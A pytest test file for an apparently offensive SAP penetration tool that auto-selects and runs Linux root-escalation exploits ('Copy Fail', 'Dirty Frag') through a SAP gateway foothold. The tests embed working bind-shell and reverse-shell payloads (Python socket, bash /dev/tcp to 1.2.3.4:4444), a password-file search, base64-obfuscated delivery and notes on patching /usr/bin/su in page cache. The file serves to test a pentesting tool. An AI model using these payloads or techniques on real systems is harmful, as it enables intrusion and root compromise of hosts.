#!/usr/bin/env python3
"""Tests for the Linux LPE auto-picker + Dirty Frag prereq probe.

All offline; SAPXPG and the dirtyfrag binary delivery are mocked.
"""
from __future__ import annotations

import os
from unittest.mock import patch

import pytest


# ===========================================================================
# Helpers
# ===========================================================================

@pytest.fixture(autouse=True)
def _no_sleep(monkeypatch):
    """copyfail and dirtyfrag's race-retry loops insert
    `time.sleep(0.5)` between failed attempts.  In production
    each retry costs ~0.5s of kernel-settling time; in tests
    this would add ~2s per failing-exploit test (4 sleeps × 5
    attempts in the failure path).  Patch it out globally so
    tests stay fast.

    Production retries on the box are NOT affected - they still
    sleep as designed; only the unit test environment skips."""
    monkeypatch.setattr("time.sleep", lambda *a, **kw: None)


def _node(os_type="Linux"):
    from sapmap_models import SAPNode
    return SAPNode(sid="LIN", ip="10.0.0.1", hostname="linhost",
                   system_type="ABAP", os_type=os_type)


def _exec_gw_canned(map_in_out):
    """Build a fake execute_gw_command that pattern-matches (prog, params)
    pairs from ``map_in_out`` (dict {(prog, params): output_lines}).
    Unknown calls return empty output."""
    def _fake(node, prog, params, long_params=""):
        for (p, a), out in map_in_out.items():
            if prog == p and (a is None or params == a):
                return {"output": out, "success": True}
        return {"output": [], "success": True}
    return _fake


# ===========================================================================
# Dirty Frag prereq probe
# ===========================================================================

def test_dirtyfrag_windows_short_circuits():
    """Windows hosts must early-exit with reason set, no SAPXPG calls."""
    from sapmap_dirtyfrag import check_dirtyfrag
    with patch("sapmap_exploit.execute_gw_command") as gw:
        out = check_dirtyfrag(_node(os_type="Windows Server 2019"))
    assert out["vulnerable"] is False
    assert "Windows" in out["reason"]
    gw.assert_not_called()


def test_dirtyfrag_non_x86_arch_fails():
    """ARM64 / aarch64 hosts must report the unsupported-arch reason."""
    from sapmap_dirtyfrag import check_dirtyfrag
    fake = _exec_gw_canned({
        ("uname", "-r"): ["6.12.0-generic"],
        ("uname", "-m"): ["aarch64"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake):
        out = check_dirtyfrag(_node())
    assert out["vulnerable"] is False
    assert "x86_64" in out["reason"]


def test_dirtyfrag_modprobe_blacklist_short_circuits():
    """If /etc/modprobe.d/dirtyfrag.conf has the upstream-recommended
    blacklist, neither variant will load — must report mitigation."""
    from sapmap_dirtyfrag import check_dirtyfrag
    fake = _exec_gw_canned({
        ("uname", "-r"): ["6.17.0-23-generic"],
        ("uname", "-m"): ["x86_64"],
        ("cat",   "/etc/modprobe.d/dirtyfrag.conf"): [
            "install esp4 /bin/false",
            "install esp6 /bin/false",
            "install rxrpc /bin/false",
        ],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake):
        out = check_dirtyfrag(_node())
    assert out["vulnerable"] is False
    assert out["mitigation_applied"] is True
    assert "blacklist" in out["reason"].lower()


def test_dirtyfrag_neither_path_viable_when_unshare_blocked_no_rxrpc():
    """If unshare(-U) fails (AppArmor) AND rxrpc.ko is unavailable,
    the host is effectively immune."""
    from sapmap_dirtyfrag import check_dirtyfrag
    fake = _exec_gw_canned({
        ("uname", "-r"): ["6.12.0-generic"],
        ("uname", "-m"): ["x86_64"],
        ("cat",   "/etc/modprobe.d/dirtyfrag.conf"): [],
        ("unshare", None): ["unshare: namespace creation failed"],
        ("lsmod",   ""): ["Module Size Used by"],
        ("modinfo", "rxrpc"): ["modinfo: ERROR: Module rxrpc not found"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake):
        out = check_dirtyfrag(_node())
    assert out["vulnerable"] is False
    assert out["esp_path_ok"] is False
    assert out["rxrpc_path_ok"] is False


def test_dirtyfrag_blob_missing_makes_vulnerable_false():
    """Even with viable kernel + path, if the vendored binary blob isn't
    built yet, we must report not-vulnerable + tell the operator how to
    build it."""
    from sapmap_dirtyfrag import check_dirtyfrag
    fake = _exec_gw_canned({
        ("uname", "-r"): ["6.17.0-23-generic"],
        ("uname", "-m"): ["x86_64"],
        ("cat",   "/etc/modprobe.d/dirtyfrag.conf"): [],
        ("unshare", None): ["DF_NS_OK_12345"],
        ("lsmod",   ""): ["rxrpc 81920 0"],
        ("modinfo", "rxrpc"): ["filename: /lib/modules/.../rxrpc.ko"],
    })
    # Force "blob missing" regardless of repo state
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_dirtyfrag._load_blob", return_value=None):
        out = check_dirtyfrag(_node())
    assert out["vulnerable"] is False
    assert out["blob_available"] is False
    assert "build.sh" in out["reason"]


def test_dirtyfrag_full_viability_with_blob():
    """When kernel + esp/rxrpc + blob are all present, vulnerable=True."""
    from sapmap_dirtyfrag import check_dirtyfrag
    fake = _exec_gw_canned({
        ("uname", "-r"): ["6.17.0-23-generic"],
        ("uname", "-m"): ["x86_64"],
        ("cat",   "/etc/modprobe.d/dirtyfrag.conf"): [],
        ("unshare", None): ["DF_NS_OK_99"],
        ("lsmod",   ""): ["rxrpc 81920 0"],
        ("modinfo", "rxrpc"): ["filename: /lib/modules/.../rxrpc.ko"],
    })
    with patch("sapmap_exploit.execute_gw_command", side_effect=fake), \
         patch("sapmap_dirtyfrag._load_blob",
               return_value={"hex": "00", "size": 1, "sha256": "abc"}):
        out = check_dirtyfrag(_node())
    assert out["vulnerable"] is True
    assert out["esp_path_ok"] is True
    assert out["rxrpc_path_ok"] is True


# ===========================================================================
# Auto-picker priority
# ===========================================================================

def test_auto_picker_prefers_copyfail_when_both_viable():
    """Copy Fail wins precedence — pure-Python, smaller blast radius."""
    from sapmap_lpe_auto import check_linux_lpe
    cf_res = {"vulnerable": True, "kernel": "6.4.0", "reason": "ok"}
    df_res = {"vulnerable": True, "kernel": "6.4.0", "arch": "x86_64",
              "reason": "ok", "mitigation_applied": False}
    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res):
        out = check_linux_lpe(_node())
    assert out["method"] == "copyfail"


def test_auto_picker_falls_back_to_dirtyfrag_when_copyfail_patched():
    """Patched-against-Copy-Fail kernel => Dirty Frag picks up the slack."""
    from sapmap_lpe_auto import check_linux_lpe
    cf_res = {"vulnerable": False, "kernel": "6.18.22", "reason": "patched"}
    df_res = {"vulnerable": True, "kernel": "6.18.22", "arch": "x86_64",
              "reason": "ok", "mitigation_applied": False}
    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res):
        out = check_linux_lpe(_node())
    assert out["method"] == "dirtyfrag"


def test_auto_picker_returns_none_when_neither_viable():
    """Both unavailable => no method, no run_linux_lpe attempt."""
    from sapmap_lpe_auto import check_linux_lpe
    cf_res = {"vulnerable": False, "kernel": "6.18.22", "reason": "patched"}
    df_res = {"vulnerable": False, "kernel": "6.18.22", "arch": "x86_64",
              "reason": "no rxrpc, no userns",
              "mitigation_applied": False}
    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res):
        out = check_linux_lpe(_node())
    assert out["method"] is None
    assert "Copy Fail" in out["summary"]
    assert "Dirty Frag" in out["summary"]


def test_force_env_overrides_auto():
    """SAPMAP_LPE_FORCE=dirtyfrag forces Dirty Frag even when Copy Fail
    is viable (operator override)."""
    from sapmap_lpe_auto import check_linux_lpe
    cf_res = {"vulnerable": True, "kernel": "6.4.0", "reason": "ok"}
    df_res = {"vulnerable": True, "kernel": "6.4.0", "arch": "x86_64",
              "reason": "ok", "mitigation_applied": False}
    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res), \
         patch.dict(os.environ, {"SAPMAP_LPE_FORCE": "dirtyfrag"}):
        out = check_linux_lpe(_node())
    assert out["method"] == "dirtyfrag"


def test_run_linux_lpe_dispatches_to_picked_method():
    """run_linux_lpe must call the picked method's run_as_root and tag
    the corresponding *_root_obtained on the node."""
    from sapmap_lpe_auto import run_linux_lpe
    cf_res = {"vulnerable": False, "kernel": "6.18.22", "reason": "patched"}
    df_res = {"vulnerable": True, "kernel": "6.18.22", "arch": "x86_64",
              "reason": "ok", "mitigation_applied": False}
    n = _node()
    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res), \
         patch("sapmap_dirtyfrag.run_as_root",
               return_value={"ok": True, "stdout": "uid=0", "error": ""}) \
             as df_run, \
         patch("sapmap_copyfail.run_as_root",
               return_value={"ok": False, "stdout": "", "error": "x"}) \
             as cf_run:
        out = run_linux_lpe(n, "id")
    assert out["ok"] is True
    assert out["method"] == "dirtyfrag"
    df_run.assert_called_once()
    cf_run.assert_not_called()
    assert n.dirtyfrag_root_obtained is True
    assert n.copyfail_root_obtained is False


def test_run_linux_lpe_no_method_returns_clean_error():
    """Both methods unviable -> error response, no run_as_root call."""
    from sapmap_lpe_auto import run_linux_lpe
    cf_res = {"vulnerable": False, "kernel": "?", "reason": "x"}
    df_res = {"vulnerable": False, "kernel": "?", "arch": "x86_64",
              "reason": "y", "mitigation_applied": False}
    n = _node()
    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res), \
         patch("sapmap_dirtyfrag.run_as_root") as df_run, \
         patch("sapmap_copyfail.run_as_root") as cf_run:
        out = run_linux_lpe(n, "id")
    assert out["ok"] is False
    assert out["method"] == ""
    df_run.assert_not_called()
    cf_run.assert_not_called()


# ===========================================================================
# Copy Fail exploit-script generator — Python template safety
# ===========================================================================
# The exploit dropped to /tmp/.cf_s.py runs as the foothold user.  It
# embeds the operator command inside a `_wf.write(<literal>)` call so
# the root wrapper script writes the command before exec'ing su.
# Previously the substitution used a sh-style escape (`'` -> `'\''`)
# which IS correct for SHELL contexts but INVALID inside a Python
# single-quoted string literal — operator-reported regression on S4H
# where the bind-shell python socket-trick payload (six embedded `'`
# chars from `__import__('socket')` etc.) crashed the script with
# SyntaxError at the _wf.write line and the wrapper was never
# written.  Fix uses Python's repr() so ANY embedded character is
# safely encoded.


def _build_cf_exploit_script(command: str) -> str:
    """Re-run the substitution logic from sapmap_copyfail.run_as_root
    (the parts that build the exploit script text) so we can assert
    Python validity offline without firing SAPXPG / ELF builders."""
    import sapmap_copyfail as _cf
    # Fake a tiny ELF so _build_elf doesn't blow up on a missing
    # wrapper path.  We don't actually execute the script, just
    # parse it.
    elf_hex = "90" * 16   # nop sled, valid hex
    full_shell_cmd = command + ' > /tmp/.cf_result 2>&1\n'
    safe_cmd_pyliteral = repr(full_shell_cmd)
    script = _cf._EXPLOIT_TEMPLATE.replace('__ELF_HEX__', elf_hex)
    script = script.replace('__COMMAND_PY_LITERAL__', safe_cmd_pyliteral)
    return script


def test_cf_exploit_script_is_valid_python_with_no_quotes():
    """Baseline — `id` has no special chars.  Just make sure the
    new template doesn't regress the simple case."""
    import ast
    script = _build_cf_exploit_script("id")
    ast.parse(script)   # raises SyntaxError if invalid


def test_cf_exploit_script_is_valid_python_with_single_quotes():
    """Regression for the S4H bug.  The bind-shell payload
    `python3 -c o=__import__('os');...s=__import__('socket')` has
    multiple embedded single quotes.  Previously this generated a
    SyntaxError-laden script.  Must now parse cleanly."""
    import ast
    payload = (
        "(nohup python3 -c "
        "o=__import__('os');o.fork()and(o._exit(0));"
        "o.close(1);o.close(2);"
        "s=__import__('socket').socket(2,1);"
        "s.setsockopt(1,2,1);s.bind(('',4444));s.listen(1);"
        "c,a=s.accept();"
        "[o.dup2(c.fileno(),i)for(i)in(0,1,2)];"
        "o.execv('/bin/bash',['/bin/bash','-i']) "
        "</dev/null >/dev/null 2>&1 &)"
    )
    script = _build_cf_exploit_script(payload)
    # Must parse without SyntaxError
    ast.parse(script)
    # Cross-check: the script literally contains the original payload
    # (so the substitution didn't quietly drop / mutate anything).
    assert payload in script or repr(payload + ' > /tmp/.cf_result 2>&1\n')[1:-1] in script


def test_cf_exploit_script_is_valid_python_with_backslashes_and_double_quotes():
    """Belt-and-braces: repr() must also handle the OS Terminal case
    where the operator types arbitrary shell with mixed quoting,
    e.g. `find / -name "*.cfg" -exec grep -l 'password' {} \\;` ."""
    import ast
    payload = (
        r"""find / -name "*.cfg" -exec grep -l 'password' {} \;"""
    )
    script = _build_cf_exploit_script(payload)
    ast.parse(script)


def test_linuxlpe_shell_dispatch_base64_encodes_payload():
    """Operator clicks Start on the Reverse Shell modal with
    method=linuxlpe_root.  The handler must build a full_cmd of
    shape ``echo <b64> | base64 -d | sh`` so the operator command
    going to copyfail/dirtyfrag has only safe chars (base64 alphabet
    + pipes).  Locks the shape against a regression where someone
    pastes the raw python -c command back into copyfail's broken
    sh-style escape path."""
    import sapmap_gui

    # Use the actual bind-payload params_str shape (the S4H
    # regression payload).
    py_code = (
        "o=__import__('os');o.fork()and(o._exit(0));"
        "o.close(1);o.close(2);"
        "s=__import__('socket').socket(2,1);"
        "s.setsockopt(1,2,1);s.bind(('',4444));s.listen(1);"
        "c,a=s.accept();"
        "[o.dup2(c.fileno(),i)for(i)in(0,1,2)];"
        "o.execv('/bin/bash',['/bin/bash','-i'])"
    )
    out = sapmap_gui._build_linuxlpe_shell_dispatch(
        "python3", f"-c {py_code}")

    # Shape: echo <b64> | base64 -d | sh
    assert out.startswith("echo "), out
    assert " | base64 -d | sh" in out, out

    # No raw single quotes in the dispatch (those would break
    # copyfail's Python template even with the repr() fix - belt
    # and braces; we want the dispatch to be invariant to template
    # changes downstream).
    assert "'" not in out, (
        f"Dispatch must not contain raw single quotes "
        f"(would break Python template); got: {out[:200]!r}")
    # No parentheses either — only safe chars on the way to sh.
    assert "(" not in out and ")" not in out, (
        f"Dispatch must not contain raw parens; got: {out[:200]!r}")


def test_linuxlpe_shell_dispatch_inner_payload_decodes_to_shquoted_python_c():
    """The base64 between `echo` and `| base64 -d | sh` must decode
    to a properly sh-quoted invocation where /bin/sh, after parsing,
    delivers the EXACT py_code as the single -c argument to python3.

    This is the core of the S4H regression fix: the previous code
    interpolated py_code directly into a sh wrapper, so sh's
    metacharacter interpretation of `(...)` and `'...'` inside
    `__import__('socket')` broke the python -c argument into
    fragments.  shlex.quote ensures sh sees py_code as ONE arg."""
    import sapmap_gui
    import base64
    import shlex

    py_code = "s=__import__('socket').socket(2,1);s.connect(('1.2.3.4',4444))"
    out = sapmap_gui._build_linuxlpe_shell_dispatch("python3", f"-c {py_code}")

    # Extract the base64 blob between `echo ` and ` |`
    b64 = out[len("echo "):out.index(" |")]
    inner = base64.b64decode(b64).decode()

    # Must be wrapped in a subshell `(...)` so the trailing & doesn't
    # combine with the outer wrapper's redirect.
    assert inner.startswith("(") and inner.endswith(")"), inner
    # Must use nohup so the python child survives the wrapper exit.
    assert "nohup python3 -c " in inner, inner
    # Stdio detached + backgrounded.
    assert "</dev/null >/dev/null 2>&1 &" in inner, inner

    # The critical assertion: when /bin/sh parses the inner payload,
    # python3 receives py_code as a single -c argument verbatim
    # (no fragmentation, no shell mutation).  shlex.split mirrors
    # /bin/sh's tokenisation, so we can verify offline.
    body = inner[1:-1]   # strip outer (...)
    tokens = shlex.split(body)
    # Expected: ['nohup', 'python3', '-c', '<py_code>', '</dev/null',
    #            '>/dev/null', '2>&1', '&']
    # But shlex doesn't fully handle redirects + `&`, so just look
    # for the python3 -c <py_code> trio.
    assert "nohup" in tokens
    assert "python3" in tokens
    minus_c_idx = tokens.index("-c")
    parsed_py_code = tokens[minus_c_idx + 1]
    assert parsed_py_code == py_code, (
        f"sh-parsed py_code differs from original:\n"
        f"  expected: {py_code!r}\n"
        f"  got:      {parsed_py_code!r}")


def test_linuxlpe_shell_dispatch_falls_through_when_no_dash_c():
    """If the payload doesn't start with `-c ` (future variant),
    the helper must still produce a valid `echo <b64> | base64 -d
    | sh` dispatch without crashing on the unexpected shape."""
    import sapmap_gui
    out = sapmap_gui._build_linuxlpe_shell_dispatch(
        "bash", "-i >/dev/tcp/1.2.3.4/4444 0>&1")
    assert out.startswith("echo "), out
    assert " | base64 -d | sh" in out, out


def test_copyfail_uses_unique_result_path_per_run():
    """Regression for the S4H stale-result bug.  /tmp has the
    sticky bit on Linux: only the file owner or root can delete
    a file there.  A SUCCESSFUL Copy Fail run leaves /tmp/.cf_result
    owned by ROOT (the patched-su wrapper ran as root + the `>`
    redirect created the file).  A subsequent run's pre-cleanup
    `rm -f /tmp/.cf_result` (as the SAP foothold user) is silently
    blocked by the sticky bit, the old root-owned file persists,
    and when the new run's exploit lost the race, the stale uid=0
    content got misread as the new run's success.

    Fix: each run uses a UNIQUE RESULT path
    (/tmp/.cf_result_<8hex>), so no previous run's leftover can
    interfere.  Lock the shape so a future refactor doesn't
    accidentally revert to the shared path."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    gw_calls = []
    def _fake_egc(node, prog, params="", long_params=""):
        gw_calls.append((prog, params, long_params[:200] if long_params else ""))
        # Simulate exploit failure: result file never written.
        if prog in ("base64", "sudo") and ".cf_result" in params:
            return {"output": ["No such file or directory"], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out1 = run_as_root(n, "id")
        out2 = run_as_root(n, "whoami")

    # Extract the result paths used in each run from the long_params
    # of the python3 -c calls that build the exploit script (those
    # contain the RESULT path that the wrapper redirects to).
    result_paths = set()
    for (prog, params, lp) in gw_calls:
        # Look for ".cf_result_" mentions anywhere - rm cleanup,
        # base64 reads, etc.
        for haystack in (params, lp):
            import re as _re
            for m in _re.finditer(r"/tmp/\.cf_result_[0-9a-f]+", haystack):
                result_paths.add(m.group())

    assert len(result_paths) >= 2, (
        f"Each run must use a UNIQUE /tmp/.cf_result_<id> path; "
        f"found only {result_paths!r} across 2 runs - paths are "
        f"being shared.  Stale-read trap can resurface.")
    # And NONE of them should be the shared /tmp/.cf_result path
    # (the trap path).
    bare = {p for p in result_paths if p == "/tmp/.cf_result"}
    assert not bare, (
        f"Found shared /tmp/.cf_result path in use - regression "
        f"of the S4H bug; got: {result_paths!r}")


def test_copyfail_exploit_script_warms_su_page_cache_before_patches():
    """The exploit script must read /usr/bin/su into the page cache
    IN-PROCESS before the _write4 patch loop, to counteract the
    upload-induced eviction.

    Operator-reported S4D regression: bind-shell payload (3103-byte
    script, 104 chunks) lost the race 5/5 times even though the
    smaller `id` test (2068-byte script, 69 chunks) won on attempt
    1.  The extra chunks churn the kernel cache enough to evict
    /usr/bin/su's pages by the time we fire the exploit.  Reading
    the file back into cache IMMEDIATELY before the patch loop
    minimises the eviction window between read + patch + execve."""
    import sapmap_copyfail
    # Inspect the actual template content - the warm-up must be in
    # the source so it ends up in every generated script.
    tmpl = sapmap_copyfail._EXPLOIT_TEMPLATE
    assert "open('/usr/bin/su', 'rb')" in tmpl, (
        f"Exploit template must open /usr/bin/su for read "
        f"before patching; not found in template")
    # Belt and braces: assert the warm-up appears BEFORE the
    # _write4 patch loop in the script (order matters - the read
    # must finish before patches start).
    warmup_idx = tmpl.index("open('/usr/bin/su', 'rb')")
    write4_loop_idx = tmpl.index("_write4(_i, _elf[_i:_i + 4])")
    assert warmup_idx < write4_loop_idx, (
        "warm-up read of /usr/bin/su must come BEFORE the "
        "_write4 patch loop in the exploit template")


def test_copyfail_warmup_uses_try_except_to_swallow_read_errors():
    """The warm-up read is wrapped in try/except so a rare
    read-permission failure (e.g. /usr/bin/su unreadable on a
    weirdly-hardened image) doesn't crash the entire exploit
    before the _write4 loop even gets a chance to run.  Patch
    failures should surface from the actual exploit pathway, not
    from the warm-up.

    The template is intentionally MINIMAL (no comment blocks
    inside the string - they bloat the shipped script and worsen
    the upload-induced page-cache churn).  Look for the try/except
    construct directly around the warm-up open() call rather than
    relying on comment markers."""
    import sapmap_copyfail
    tmpl = sapmap_copyfail._EXPLOIT_TEMPLATE
    # Find the warm-up open() call and verify it's inside a try
    # block.  Walk back from the open() to the nearest preceding
    # statement keyword - that should be `try:`.
    warm_idx = tmpl.index("open('/usr/bin/su', 'rb')")
    # The warm-up has the shape:
    #   try:
    #       with open('/usr/bin/su', 'rb') as _wsu: _wsu.read()
    #   except Exception: pass
    # so `try:` must appear within ~50 chars before the open(),
    # and `except` within ~100 chars after.
    pre = tmpl[max(0, warm_idx - 50):warm_idx]
    post = tmpl[warm_idx:warm_idx + 200]
    assert "try:" in pre, (
        f"No `try:` before warm-up read; pre-context: {pre!r}")
    assert "except" in post, (
        f"No `except` after warm-up read; post-context: {post!r}")


def test_dirtyfrag_warms_su_page_cache_before_each_attempt():
    """Dirty Frag mirror: read /usr/bin/su via SAPXPG `cat` right
    before each binary attempt.  Less surgical than copyfail's
    in-process warm-up (the SAPXPG round-trip leaves a ~200ms
    eviction window) but better than no warm-up — especially for
    the first attempt right after the upload churn."""
    from sapmap_dirtyfrag import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.dirtyfrag_kernel = "6.18.21"

    gw_calls = []
    def _fake_egc(node, prog, params="", long_params=""):
        gw_calls.append((prog, params))
        if prog in ("base64", "sudo") and ".df_result" in params:
            return {"output": ["No such file"], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_dirtyfrag._load_blob", return_value={
            "hex": "00" * 100, "size": 100, "sha256": "a" * 64}), \
         patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id")

    # Find each `cat /usr/bin/su` warm-up call and the `/tmp/.df_bin`
    # binary execution call - the cat must IMMEDIATELY precede the
    # binary, with no other SAPXPG calls between them, on every
    # retry attempt.
    cat_idxs = [i for i, (p, a) in enumerate(gw_calls)
                  if p == "cat" and "/usr/bin/su" in a]
    bin_idxs = [i for i, (p, a) in enumerate(gw_calls)
                  if p == "/tmp/.df_bin"]
    assert len(cat_idxs) >= 1, (
        "Must call `cat /usr/bin/su` at least once to warm the "
        "page cache before firing the binary")
    assert len(bin_idxs) >= 1, "Binary must be invoked"
    # Every binary invocation must be preceded by a cat warm-up.
    for bin_i in bin_idxs:
        # The cat call must be the IMMEDIATELY previous call
        # (no other SAPXPG round-trip allowed to evict between
        # them).
        prev_call = gw_calls[bin_i - 1] if bin_i > 0 else None
        assert prev_call is not None
        assert prev_call[0] == "cat" and "/usr/bin/su" in prev_call[1], (
            f"Binary call at idx {bin_i} not immediately preceded "
            f"by `cat /usr/bin/su` warm-up; prev call was: "
            f"{prev_call!r}")


def test_copyfail_progress_cb_fires_during_upload_and_attempts():
    """copyfail.run_as_root accepts a ``progress_cb`` callback that
    fires during major steps so the GUI's bind-shell status row can
    update during the ~30-90s chunked upload + exploit attempts.

    Operator-reported S4D issue: the bind-shell modal showed a
    single static "Routing payload through Linux LPE..." line for
    2 minutes while 104 chunks uploaded — looked frozen."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    progress_msgs = []
    def _capture(msg):
        progress_msgs.append(msg)

    def _fake_egc(node, prog, params="", long_params=""):
        if prog == "python3" and params == "/tmp/.cf_s.py":
            return {"output": [], "success": True}
        if prog == "base64" and ".cf_result_" in params:
            import base64 as _b64
            return {"output": [_b64.b64encode(b"uid=0(root)\n").decode()],
                    "success": True}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id", progress_cb=_capture)

    assert out["ok"] is True
    assert any("delivering exploit" in m for m in progress_msgs), (
        f"No 'delivering exploit' progress msg; got: {progress_msgs!r}")
    assert any("firing exploit" in m for m in progress_msgs), (
        f"No 'firing exploit' progress msg; got: {progress_msgs!r}")
    assert any("%)" in m and "chunk" in m for m in progress_msgs), (
        f"No '<n>%' chunk-progress msg; got: {progress_msgs!r}")


def test_copyfail_progress_cb_optional_default_none():
    """``progress_cb`` is optional - the OS Terminal `id` flow
    (which doesn't have a progress bar) calls run_as_root without
    a callback.  Lock the default-None signature."""
    from sapmap_copyfail import run_as_root
    import inspect
    sig = inspect.signature(run_as_root)
    assert "progress_cb" in sig.parameters
    assert sig.parameters["progress_cb"].default is None


def test_copyfail_progress_cb_buggy_callback_does_not_break_exploit():
    """A buggy/raising progress_cb must not propagate an exception
    that would tear down the exploit run."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    def _bad_cb(msg):
        raise RuntimeError("intentional test failure")

    def _fake_egc(node, prog, params="", long_params=""):
        if prog == "python3" and params == "/tmp/.cf_s.py":
            return {"output": [], "success": True}
        if prog == "base64" and ".cf_result_" in params:
            import base64 as _b64
            return {"output": [_b64.b64encode(b"uid=0(root)\n").decode()],
                    "success": True}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id", progress_cb=_bad_cb)
    assert out["ok"] is True


def test_run_linux_lpe_forwards_progress_cb_to_copyfail():
    """run_linux_lpe must forward progress_cb to the chosen
    technique's run_as_root.  Without this, the shell_start
    handler's _set_progress wiring would be a no-op."""
    from sapmap_lpe_auto import run_linux_lpe
    cf_res = {"vulnerable": True, "kernel": "6.18.21", "reason": "ok"}
    df_res = {"vulnerable": False, "kernel": "6.18.21", "arch": "x86_64",
              "reason": "x", "mitigation_applied": False}

    captured_cb = {}
    def _fake_run_as_root(node, command, timeout=60.0, progress_cb=None):
        captured_cb["progress_cb"] = progress_cb
        return {"ok": True, "stdout": "uid=0", "error": ""}

    def _my_cb(msg):
        pass

    with patch("sapmap_copyfail.check_copyfail", return_value=cf_res), \
         patch("sapmap_dirtyfrag.check_dirtyfrag", return_value=df_res), \
         patch("sapmap_copyfail.run_as_root",
                 side_effect=_fake_run_as_root):
        out = run_linux_lpe(_node(), "id", progress_cb=_my_cb)

    assert out["ok"] is True
    assert captured_cb["progress_cb"] is _my_cb


def test_copyfail_retries_on_race_loss_and_succeeds():
    """The Copy Fail page-cache patch is race-based.  When the
    kernel evicts the patched pages between our patch loop and
    fork+execve, un-patched /usr/bin/su runs, asks for a real
    password, and dies with 'Authentication token manipulation
    error' - the wrapper script never runs, the result file
    stays missing.

    Operator-reported S4H regression: this race loses ~50% of the
    time on busy systems.  Before this fix, the FIRST race-loss
    meant the whole LPE attempt failed and the operator had to
    click Run again from the GUI.

    Auto-retry inside run_as_root re-fires `python3 SCRIPT` up to
    5 times; each invocation is an independent race attempt.  This
    test simulates the first 2 attempts losing the race + the 3rd
    landing the patch; the overall run must report ok=True.  Locks
    both the retry loop AND the early-break-on-success behaviour."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    # Mutable counter tracking which attempt we're on.  Each
    # `python3 SCRIPT` call increments it.  base64 read-back
    # returns "No such file" for attempts 1 + 2 (race lost),
    # then returns valid base64 of "uid=0(root)..." for attempt
    # 3 (race won).
    state = {"script_run_count": 0}

    def _fake_egc(node, prog, params="", long_params=""):
        if prog == "python3" and params == "/tmp/.cf_s.py":
            state["script_run_count"] += 1
            return {
                "output": ["Password: su: Authentication token "
                           "manipulation error"],
                "success": True,
            }
        # base64 read-back: file missing for first 2 script runs,
        # then has valid content on the 3rd.
        if prog == "base64" and ".cf_result_" in params:
            if state["script_run_count"] < 3:
                return {"output": [f"base64: {params}: No such "
                                    "file or directory"],
                        "success": False}
            # Race won on attempt 3 -> wrapper wrote
            # "uid=0(root)..." to the result file.  base64 of
            # "uid=0(root) gid=0(root)\n":
            import base64 as _b64
            content = b"uid=0(root) gid=0(root)\n"
            return {"output": [_b64.b64encode(content).decode()],
                    "success": True}
        # Sudo fallback shouldn't fire if base64 works for the
        # 3rd attempt, but be defensive.
        if prog == "sudo":
            return {"output": ["[sudo] password for ..."], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id")

    # 3 attempts fired before the success was detected.
    assert state["script_run_count"] == 3, (
        f"Expected exactly 3 SCRIPT runs (2 race-losses + 1 win); "
        f"got {state['script_run_count']}")
    # Overall run reports success with the won attempt's output.
    assert out["ok"] is True
    assert "uid=0(root)" in out["stdout"]


def test_copyfail_retry_loop_bails_after_max_attempts():
    """When EVERY attempt loses the race (very unusual), the
    retry loop must bail after the cap rather than hang forever.
    Lock the cap so a future regression doesn't accidentally
    bump it to unbounded.  Also verify the error string mentions
    `5 attempts` so the operator knows how hard the runner tried."""
    from sapmap_copyfail import run_as_root

    n = _node()
    n.gw_vulnerable = True
    n.copyfail_kernel = "6.18.21"

    state = {"script_run_count": 0}

    def _fake_egc(node, prog, params="", long_params=""):
        if prog == "python3" and params == "/tmp/.cf_s.py":
            state["script_run_count"] += 1
            return {
                "output": ["Password: su: Authentication token "
                           "manipulation error"],
                "success": True,
            }
        if prog == "base64" and ".cf_result_" in params:
            return {"output": ["No such file or directory"],
                    "success": False}
        if prog == "sudo":
            return {"output": [], "success": False}
        return {"output": [], "success": True}

    with patch("sapmap_exploit.execute_gw_command", side_effect=_fake_egc):
        out = run_as_root(n, "id")

    # All 5 retry attempts fired before the loop bailed.
    assert state["script_run_count"] == 5, (
        f"Retry loop should attempt exactly 5 times; got "
        f"{state['script_run_count']}")
    assert out["ok"] is False
    assert "5 attempts" in out["error"], (
        f"Error must mention attempt count so operator knows the "
        f"runner already retried: {out['error']!r}")


def test_copyfail_deterministic_failure_diagnosis():
    """When ALL 5 attempts hit the SAME PAM failure, the exploit
    primitive is being silently rejected - the kernel is patched
    even though our heuristic vuln-check says otherwise.  More
    retries won't help that case.  Operator-actionable: the
    diagnostic must say 'deterministic' and recommend a
    different LPE path, NOT 'race lost, retry'.

    Regression for S4H lab: SLES 6.4 kernel reports vulnerable
